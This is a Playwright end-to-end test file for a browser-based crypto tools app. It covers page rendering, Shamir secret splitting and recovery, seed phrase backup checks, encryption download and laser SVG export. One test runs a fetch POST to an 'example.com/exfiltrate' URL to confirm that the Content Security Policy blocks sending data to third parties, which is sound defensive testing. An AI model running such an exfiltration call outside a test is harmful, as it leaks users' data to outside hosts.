import { expect, type Page, test } from '@playwright/test';

import { TOOLS } from '../src/shared/presentation/tools/tool-registry';

const ROUTES = ['/', '/tools', ...TOOLS.map((tool) => tool.path)];

/** Builds the URL for the current project: path routing or hash routing. */
function urlFor(projectName: string, baseURL: string, route: string) {
  return projectName === 'single'
    ? `${baseURL}#${route}`
    : new URL(route, baseURL).href;
}

function collectErrors(page: Page) {
  const errors: string[] = [];
  page.on('pageerror', (error) => errors.push(`pageerror: ${error.message}`));
  page.on('console', (message) => {
    if (message.type() === 'error') errors.push(`console: ${message.text()}`);
  });
  return errors;
}

for (const route of ROUTES) {
  test(`renders ${route} without errors`, async ({ page, baseURL }, info) => {
    const errors = collectErrors(page);

    await page.goto(urlFor(info.project.name, baseURL!, route));

    await expect(page.locator('h1').first()).toBeVisible();
    if (route.startsWith('/tools/')) {
      // The self-test settles, never fails, and the tool appears below it.
      await expect(page.getByText('Running self-test')).toHaveCount(0);
      await expect(page.getByText('Self-test failed')).toHaveCount(0);
      await expect(page.getByText('How to use')).toBeVisible();
    }
    expect(errors).toEqual([]);
  });
}

test('a crypto tool shows its passed self-test', async ({
  page,
  baseURL,
}, info) => {
  await page.goto(urlFor(info.project.name, baseURL!, '/tools/hash'));
  await expect(page.getByText('Self-test passed')).toBeVisible();
});

test('unknown tool shows the 404 panel inside the tools shell', async ({
  page,
  baseURL,
}, info) => {
  const errors = collectErrors(page);

  await page.goto(urlFor(info.project.name, baseURL!, '/tools/jwt'));

  await expect(
    page.getByRole('heading', { name: 'This tool does not exist.' })
  ).toBeVisible();
  // The sidebar of the tools layout is still there.
  await expect(
    page.getByRole('link', { name: 'All tools' }).first()
  ).toBeVisible();
  expect(errors.filter((e) => !e.includes('404'))).toEqual([]);
});

test('unknown page outside /tools shows the page 404', async ({
  page,
  baseURL,
}, info) => {
  await page.goto(urlFor(info.project.name, baseURL!, '/does-not-exist'));

  await expect(
    page.getByRole('heading', { name: 'Page not found.' })
  ).toBeVisible();
});

test('secrets are discarded when leaving a tool', async ({
  page,
  baseURL,
}, info) => {
  await page.goto(urlFor(info.project.name, baseURL!, '/tools/shamir'));
  const secretField = page.getByPlaceholder(/secret/i).first();
  await secretField.fill('correct horse battery staple');
  await expect(secretField).toHaveValue('correct horse battery staple');

  await page.getByRole('link', { name: 'Hash Tool' }).first().click();
  await expect(page.getByRole('heading', { name: 'Hash Tool' })).toBeVisible();
  await page.goBack();

  await expect(page.getByPlaceholder(/secret/i).first()).toHaveValue('');
});

test('the page cannot send data to a third party (CSP)', async ({
  page,
  baseURL,
}, info) => {
  await page.goto(urlFor(info.project.name, baseURL!, '/tools/hash'));
  await expect(page.locator('h1').first()).toBeVisible();

  const outcome = await page.evaluate(async () => {
    try {
      await fetch('https://example.com/exfiltrate', {
        method: 'POST',
        body: 'x',
      });
      return 'sent';
    } catch {
      return 'blocked';
    }
  });
  expect(outcome).toBe('blocked');
});

test('a new seed reaches Complete only after the backup check', async ({
  page,
  baseURL,
}, info) => {
  await page.goto(
    urlFor(info.project.name, baseURL!, '/tools/seed-generation')
  );
  await page.getByRole('button', { name: /Generate 12-word phrase/ }).click();
  await page.getByRole('button', { name: 'Show seed phrase' }).click();
  const words = await page
    .getByRole('list', { name: 'Seed words' })
    .locator('li span:last-child')
    .allTextContents();
  expect(words).toHaveLength(12);

  await page.getByRole('button', { name: /check my backup/ }).click();
  // Wrong words keep the flow on Verify.
  const fields = page.getByLabel(/^Word \d+$/);
  const count = await fields.count();
  for (let i = 0; i < count; i++) await fields.nth(i).fill('wrong');
  await page.getByRole('button', { name: 'Check words' }).click();
  await expect(page.getByText('Backup verified')).toHaveCount(0);

  for (let i = 0; i < count; i++) {
    const label = await page
      .getByText(/^Word \d+$/)
      .nth(i)
      .textContent();
    const position = Number(label!.replace('Word ', '')) - 1;
    await fields.nth(i).fill(words[position]);
  }
  await page.getByRole('button', { name: 'Check words' }).click();
  await expect(page.getByText('Backup verified')).toBeVisible();
});

test('text encryption offers a download', async ({ page, baseURL }, info) => {
  await page.goto(urlFor(info.project.name, baseURL!, '/tools/encryption'));
  await page.getByLabel('Text to encrypt').fill('hello');
  await page.locator('#key-input').fill('correct horse');
  await page.getByRole('button', { name: 'Encrypt', exact: true }).click();
  await expect(page.getByRole('button', { name: 'Download' })).toBeVisible();
});

test('Shamir: live recovery counts shares and opens with M', async ({
  page,
  baseURL,
}, info) => {
  await page.goto(urlFor(info.project.name, baseURL!, '/tools/shamir'));
  await page.getByLabel('Secret').fill('correct horse battery staple');
  await page.getByRole('button', { name: /Split into 5 shares/ }).click();
  const shares = await page.locator('ol li p.font-mono').allTextContents();
  expect(shares).toHaveLength(5);

  await page.getByRole('tab', { name: 'Reconstruct' }).click();
  const input = page.getByLabel('Shares');
  const recover = page.getByRole('button', { name: 'Recover secret' });

  await input.fill([shares[0], shares[0], shares[3]].join('\n'));
  await expect(page.getByText('2 of 3', { exact: true })).toBeVisible();
  await expect(page.getByText('Duplicate')).toBeVisible();
  await expect(page.getByText(/Locked: 2 of 3 shares/)).toBeVisible();
  await expect(recover).toBeDisabled();

  await input.fill([shares[0], shares[3], shares[4]].join('\n'));
  await expect(recover).toBeEnabled();
  await recover.click();
  await expect(page.getByText('correct horse battery staple')).toBeVisible();
});

test('Shamir: old v2 shares still open, flagged as legacy', async ({
  page,
  baseURL,
}, info) => {
  const { SHAMIR_V2_VECTOR } = await import(
    '../src/modules/shamir-tool/domain/vectors/v2-vectors'
  );
  await page.goto(urlFor(info.project.name, baseURL!, '/tools/shamir'));
  await page.getByRole('tab', { name: 'Reconstruct' }).click();
  await page
    .getByLabel('Shares')
    .fill(SHAMIR_V2_VECTOR.shares.slice(1, 4).join('\n'));
  await page.getByRole('button', { name: 'Recover secret' }).click();
  await expect(page.getByText('Old share format (v2)')).toBeVisible();
  await expect(page.getByText(SHAMIR_V2_VECTOR.secret)).toBeVisible();
});

test('Shamir: exports one laser SVG per share at 1:1 in mm', async ({
  page,
  baseURL,
}, info) => {
  await page.goto(urlFor(info.project.name, baseURL!, '/tools/shamir'));
  await page.getByLabel('Secret').fill('correct horse battery staple');
  await page.getByRole('button', { name: /Split into 5 shares/ }).click();
  await page.getByRole('button', { name: 'Export for laser' }).click();
  await expect(page.getByText('Whoever engraves sees the share')).toBeVisible();

  const [download] = await Promise.all([
    page.waitForEvent('download'),
    page.getByRole('button', { name: 'Download share 2 SVG' }).click(),
  ]);
  expect(download.suggestedFilename()).toMatch(/^share-2-of-5-set-.+\.svg$/);
  const { readFile } = await import('node:fs/promises');
  const svg = await readFile((await download.path())!, 'utf8');
  expect(svg).toContain('width="181.2mm"');
  expect(svg).toContain('id="front-qr"');
  expect(svg).not.toContain('<text');
});
